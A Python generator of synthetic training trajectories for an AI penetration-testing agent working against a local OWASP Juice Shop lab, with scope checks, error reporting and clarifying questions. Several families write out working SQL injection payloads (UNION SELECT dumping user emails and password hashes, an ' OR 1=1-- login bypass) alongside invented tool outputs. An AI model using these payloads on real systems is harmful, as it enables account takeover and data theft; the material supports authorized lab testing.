"""High-signal pro trajectories for Stage 1 SFT (grounding, error handling, multi-port AppSec, and net-ops).

Fixes the exact failure modes observed in real SANY sessions and the 1,200-case benchmark:
1. Connection refused (curl exit code 7) -> check `ss -ltnp` and report truthfully (never hallucinate).
2. Local service startup -> locate app, check port, start in background, verify HTTP 200.
3. Ambiguous / slang prompts -> ask a brief clarifying question (never run xdg-open / meme URLs).
4. Strict multi-host scope.txt refusal -> always `cat scope.txt` first and refuse out-of-scope targets.
5. UNION SQLi + multi-step writeup.md across arbitrary ports (3000, 5000, 8000, 8080, 8443, 9000) via curl.
6. Bug-bounty mastery: 301/302 redirect follow, minified JS bundle secret/route extraction,
   dangling CNAME takeover, .env/actuator leaks, 403 -> /api/v1/ bypass, and sudo traceroute recovery.
"""

from gen_data import Traj, pick, R, HOME, RECOVERY, validate

ASSESS_DIRS = [
    '/home/yamin/security/bounty-bench-1k',
    '/home/yamin/security/juice-shop-assessment',
    '/home/yamin/pentest/lab',
]

MULTI_SCOPE_FILES = {
    'scope.txt': 'localhost\n127.0.0.1\nlocalhost:3000\nlocalhost:8080\nlocalhost:5000\nstaging.lab.local\napi.lab.local\n',
    'README.md': '# Local AppSec & Bug Bounty Lab\nAuthorized self-testing only.\n',
}

PORTS = [3000, 5000, 8000, 8080, 8443, 9000]


def fam_pro_conn_refused():
    """curl exits with code 7 (connection refused) -> verify port is closed and report truthfully."""
    port = pick(PORTS)
    ep = pick(['/api/Products', '/rest/user/whoami', '/health', '/api/users'])
    url = f'http://127.0.0.1:{port}{ep}'
    prompt = pick([
        f'check {url} and tell me what it returns',
        f'test the endpoint {url} for auth issues',
        f'query {url} and inspect the response',
    ])
    t = Traj(prompt, MULTI_SCOPE_FILES, cwd=pick(ASSESS_DIRS), extra_shell=[
        (r'curl\b', f'curl: (7) Failed to connect to 127.0.0.1 port {port} after 0 ms: Connection refused\nExit Code: 7'),
        (r'\bss\b', ''),
    ])
    t.sh(f'curl -s {url}', f'Request {url}.')
    t.sh(f'ss -ltnp | grep :{port}', f'Check if anything is listening on port {port}.')
    ans = (f'Nothing is listening on `127.0.0.1:{port}` right now (`curl` exited with code 7: Connection refused, '
           f'and `ss -ltnp` shows no listener on port `{port}`). Start the local server first, then I can test `{ep}`.')
    return t.answer(ans)


def fam_pro_start_local_app():
    """User asks to open/start Juice Shop on a port and verify it is up."""
    port = pick([3000, 3001])
    prompt = pick([
        f'open juice shop on port {port} and check if it responds',
        f'start my local juice shop app on port {port} and verify it is running',
        'launch the local juice shop server and confirm it is reachable',
    ])
    files = {
        'scope.txt': f'localhost\n127.0.0.1\nlocalhost:{port}\n',
        'package.json': '{"name": "juice-shop", "scripts": {"start": "node build/app.js"}}\n',
    }
    t = Traj(prompt, files, cwd='/home/yamin/Development/juice-shop', extra_shell=[
        (r'\bss\b', ''),
        (r'npm start|nohup', f'Started juice-shop in background (pid 48210), listening on port {port}.'),
        (r'curl\b', 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\nX-Frame-Options: SAMEORIGIN'),
    ])
    t.sh(f'ss -ltnp | grep :{port}', f'Check if port {port} is already listening.')
    t.sh(f'nohup npm start > /tmp/juiceshop.log 2>&1 & sleep 2', 'Start Juice Shop in the background.')
    t.sh(f'curl -sI http://127.0.0.1:{port}', f'Verify http://127.0.0.1:{port} responds with HTTP 200.')
    return t.answer(f'Juice Shop is now running in the background and `http://127.0.0.1:{port}` returned **HTTP 200 OK**. '
                    f'Tell me which check or endpoint you want to test next.')


def fam_pro_ambiguous_clarify():
    """Ambiguous/slang prompt -> ask a brief clarifying question, never run random commands."""
    prompt, reply = pick([
        ('open up juice box and try to beat it',
         'Do you mean your local **OWASP Juice Shop** app (`~/Development/juice-shop`)? If so, tell me whether to start it on port `3000` and which checks to run.'),
        ('crack that thing on my machine',
         'Which local app or file are you referring to? Give me the folder, port, or filename and I will inspect it.'),
        ('beat the box',
         'Which target or local lab container do you want me to test? Point me to the directory with `scope.txt` or the local port.'),
        ('do the hacky thing on it',
         'Which authorized local target or endpoint do you want me to test, and what should I check for?'),
    ])
    t = Traj(prompt, MULTI_SCOPE_FILES, cwd=HOME)
    return t.answer(reply)


def fam_pro_scope_refuse_multi():
    """Strict scope.txt check against external IPs on multi-host scope.txt."""
    ext_ip = pick(['208.67.222.222', '140.82.121.4', '198.51.100.14', '203.0.113.25', '1.1.1.1', '8.8.8.8', '9.9.9.9'])
    verb = pick(['port-scan', 'run nmap -sV against', 'scan open ports on', 'enumerate services on', 'probe TCP ports on'])
    prompt = f'{verb} {ext_ip} for me'
    t = Traj(prompt, MULTI_SCOPE_FILES, cwd=pick(ASSESS_DIRS))
    t.sh('cat scope.txt', 'Confirm the target is authorized before scanning.')
    ans = (f'`{ext_ip}` is **not in `scope.txt`** (which authorizes only `localhost`, `127.0.0.1`, `staging.lab.local`, and `api.lab.local`), '
           f'so I do not have authorization to scan it and will not run `nmap` against it.')
    return t.answer(ans)


def fam_pro_union_ports():
    """UNION SQLi across arbitrary local ports using curl (never web_fetch)."""
    port = pick(PORTS)
    prompt = pick([
        f'use the product search on http://127.0.0.1:{port} to dump user account hashes via UNION SQLi',
        f'exploit UNION SQL injection on http://127.0.0.1:{port}/rest/products/search and list the emails and hashes',
        f'extract users and password hashes from http://127.0.0.1:{port} search API',
    ])
    out = ('{"status":"success","data":['
           '{"id":1,"name":"admin@juice-sh.op","description":"0192023a7bbd73250516f069df18b500"},'
           '{"id":2,"name":"jim@juice-sh.op","description":"e541ca7ecf72b8d1286474fc613e5e45"}]}')
    cmd = (f'curl -s -G "http://127.0.0.1:{port}/rest/products/search" '
           f'--data-urlencode "q=x\')) UNION SELECT id,email,password,\'4\',\'5\',\'6\',\'7\',\'8\',\'9\' FROM Users--"')
    t = Traj(prompt, MULTI_SCOPE_FILES, cwd=pick(ASSESS_DIRS), extra_shell=[(r'/rest/products/search', out)])
    t.sh('cat scope.txt', 'Confirm the target is in scope.')
    t.sh(cmd, f'Test UNION SELECT injection on http://127.0.0.1:{port}/rest/products/search.')
    ans = (f'UNION SQL injection succeeded on `http://127.0.0.1:{port}/rest/products/search`, dumping the `Users` table '
           f'(emails and MD5 password hashes):\n\n'
           f'- `admin@juice-sh.op`: `0192023a7bbd73250516f069df18b500`\n'
           f'- `jim@juice-sh.op`: `e541ca7ecf72b8d1286474fc613e5e45`\n\n'
           f'**Fix:** Use parameterized queries and bcrypt/argon2 instead of unsalted MD5.')
    return t.answer(ans)


def fam_pro_writeup_ports():
    """Multi-step SQLi auth bypass + UNION dump + write_file(writeup.md) across arbitrary ports."""
    port = pick(PORTS)
    prompt = pick([
        f'exploit the single worst bug on http://127.0.0.1:{port} and save a short writeup to writeup.md',
        f'test SQLi on http://127.0.0.1:{port} and write a concise findings report to writeup.md',
    ])
    login_out = '{"authentication":{"token":"eyJhbGciOiJSUzI1NiJ9.ADMIN.sig","bid":1,"umail":"admin@juice-sh.op"}}'
    union_out = '{"status":"success","data":[{"id":1,"name":"admin@juice-sh.op","description":"0192023a7bbd73250516f069df18b500"}]}'
    t = Traj(prompt, MULTI_SCOPE_FILES, cwd=pick(ASSESS_DIRS), extra_shell=[
        (r'/rest/user/login', login_out),
        (r'/rest/products/search', union_out),
    ])
    t.sh('cat scope.txt', 'Confirm the target is in scope.')
    t.sh(rf'''curl -s -X POST http://127.0.0.1:{port}/rest/user/login -H "Content-Type: application/json" -d "{{\"email\":\"' OR 1=1--\",\"password\":\"x\"}}"''',
         'Test SQLi authentication bypass on login.')
    t.sh(f'''curl -s -G "http://127.0.0.1:{port}/rest/products/search" --data-urlencode "q=x')) UNION SELECT id,email,password,'4','5','6','7','8','9' FROM Users--"''',
         'Test UNION SQLi on product search.')
    md = (f'# Security Writeup — http://127.0.0.1:{port}\n\n'
          f'## SQL Injection (Critical)\n'
          f'- **Login Bypass (`POST /rest/user/login`):** `\' OR 1=1--` returned an admin JWT.\n'
          f'- **UNION SQLi (`GET /rest/products/search`):** Leaked `admin@juice-sh.op` MD5 hash.\n\n'
          f'## Remediation\nUse parameterized queries and salted bcrypt/argon2 password hashing.\n')
    t.call('write_file', file_path='writeup.md', content=md)
    return t.answer(f'Confirmed SQL injection (auth bypass + UNION user dump) on `http://127.0.0.1:{port}` and saved the writeup to `writeup.md`.')


def fam_pro_js_bundle():
    """Extract hidden internal API route and hardcoded sk_live key from minified JS bundle."""
    port = pick(PORTS)
    idx = R.randint(10, 99)
    ep = f'/api/v2/internal/{pick(["export-users", "dump-keys", "admin-tokens", "debug-state"])}-{idx}'
    key = f'sk_live_{100000 + idx * 7919:x}a9f'
    js_name = pick(['app.bundle.js', 'main.chunk.js', 'runtime.bundle.js'])
    bloated = (
        '/* minified webpack bundle */\n'
        + f"\nconst HIDDEN_ROUTE = '{ep}';\nconst api_key = '{key}';\n"
    )
    prompt = f'fetch the JavaScript bundle at http://127.0.0.1:{port}/assets/{js_name} and find any hidden internal API endpoints and hardcoded API keys'
    t = Traj(prompt, MULTI_SCOPE_FILES, cwd=pick(ASSESS_DIRS), extra_shell=[(r'curl\b', bloated)])
    t.sh(f'curl -s http://127.0.0.1:{port}/assets/{js_name}', f'Fetch {js_name} and inspect for routes and secrets.')
    return t.answer(f'Found in `{js_name}`:\n- **Hidden internal endpoint:** `{ep}`\n- **Hardcoded API key:** `{key}`\n\nRemove hardcoded secrets from client bundles and enforce server-side auth.')


def fam_pro_redirect_and_takeover():
    """Cover 301/302 redirect follow OR dangling CNAME takeover."""
    if R.random() < 0.5:
        port = pick(PORTS)
        src = pick(['/legacy', '/old', '/v1'])
        dst = pick(['/v2/portal', '/dashboard/home'])
        fw = pick(['Express', 'nginx/1.24.0', 'gunicorn/20.1.0'])
        step1 = f'HTTP/1.1 301 Moved Permanently\nLocation: http://127.0.0.1:{port}{dst}\nContent-Length: 0'
        final = f'HTTP/1.1 301 Moved Permanently\nLocation: http://127.0.0.1:{port}{dst}\n\nHTTP/1.1 200 OK\nServer: {fw}\nAccess-Control-Allow-Origin: *'
        prompt = f'check the HTTP headers on http://127.0.0.1:{port}{src} — follow the redirect and tell me the Server banner and CORS header on the final destination'
        t = Traj(prompt, MULTI_SCOPE_FILES, cwd=pick(ASSESS_DIRS), extra_shell=[
            (rf'curl\s+.*(-[a-zA-Z]*L|--location)', final),
            (rf'curl\b', step1),
        ])
        t.sh(f'curl -sI http://127.0.0.1:{port}{src}', 'Inspect initial headers.')
        t.sh(f'curl -sIL http://127.0.0.1:{port}{src}', 'Follow redirect to final destination.')
        return t.answer(f'Following the `301` redirect to `{dst}` reveals `Server: {fw}` and wide-open CORS (`Access-Control-Allow-Origin: *`).')
    bucket = f'corp-staging-bucket-{R.randint(100, 999)}'
    cname = f';; ANSWER SECTION:\nstaging.lab.local.\t300\tIN\tCNAME\t{bucket}.s3.amazonaws.com.'
    s3 = f'<?xml version="1.0"?><Error><Code>NoSuchBucket</Code><BucketName>{bucket}</BucketName></Error>'
    t = Traj('check staging.lab.local for a dangling CNAME / subdomain takeover', MULTI_SCOPE_FILES, cwd=pick(ASSESS_DIRS),
             extra_shell=[(r'dig|host', cname), (r'curl', s3)])
    t.sh('dig CNAME staging.lab.local', 'Resolve CNAME record for staging.lab.local.')
    t.sh('curl -s http://staging.lab.local', 'Check if the target S3 bucket is unclaimed.')
    return t.answer(f'`staging.lab.local` has a dangling `CNAME` to `{bucket}.s3.amazonaws.com`, which returns `NoSuchBucket` — vulnerable to **subdomain takeover**.')


def fam_pro_net_recovery():
    """Cover ICMP traceroute sudo recovery and L2 switch ARP discovery."""
    if R.random() < 0.5:
        out_unpriv = 'You do not have enough privileges to use this traceroute method.\nsocket: Operation not permitted'
        out_sudo = ('traceroute to 1.1.1.1 (1.1.1.1), 30 hops max\n'
                    ' 1  192.168.0.1  1.1 ms\n 2  192.168.1.220  24.5 ms\n 3  172.20.20.1  26.1 ms')
        t = Traj('run an ICMP traceroute to 1.1.1.1 and report the first three hop IPs', {}, cwd=HOME, extra_shell=[
            (r'^sudo\s+traceroute\s+.*-I', out_sudo),
            (r'^traceroute\s+.*-I', out_unpriv),
        ])
        t.sh('traceroute -I 1.1.1.1', 'Run ICMP traceroute.')
        t.sh('sudo traceroute -I 1.1.1.1', 'Re-run with sudo after Operation not permitted.')
        return t.answer('First three ICMP hops to `1.1.1.1`: `192.168.0.1`, `192.168.1.220`, `172.20.20.1`.')
    sw_ip = f'192.168.0.{R.randint(240, 254)}'
    sw_mac = f'b8:27:eb:{R.randint(10, 99):02x}:{R.randint(10, 99):02x}:99'
    arp_out = f'dlinkrouter (192.168.0.1) at 40:86:cb:7a:a7:20 [ether] on enp2s0\nprocurve-switch ({sw_ip}) at {sw_mac} [ether] on enp2s0'
    t = Traj('my router is connected to a managed switch on the LAN — find the IP and MAC address of the switch', {}, cwd=HOME,
             extra_shell=[(r'ip\s+neigh|arp', arp_out)])
    t.sh('arp -a', 'Inspect the ARP table to locate the managed switch on the LAN.')
    return t.answer(f'Found the managed switch (`procurve-switch`): IP **{sw_ip}**, MAC **{sw_mac}**.')


PRO_FAMILIES = [
    (fam_pro_conn_refused, 8),
    (fam_pro_start_local_app, 5),
    (fam_pro_ambiguous_clarify, 5),
    (fam_pro_scope_refuse_multi, 10),
    (fam_pro_union_ports, 10),
    (fam_pro_writeup_ports, 8),
    (fam_pro_js_bundle, 6),
    (fam_pro_redirect_and_takeover, 6),
    (fam_pro_net_recovery, 6),
]

# Register recovery families so validate() accepts the single deliberate error
RECOVERY.update({'fam_pro_conn_refused', 'fam_pro_net_recovery'})


if __name__ == '__main__':
    for f, _ in PRO_FAMILIES:
        msgs = f()
        ok = validate(f.__name__, msgs)
        print(f'{f.__name__:28} valid={ok}')
        assert ok, f'{f.__name__} failed validation'
    print('all pro families OK')
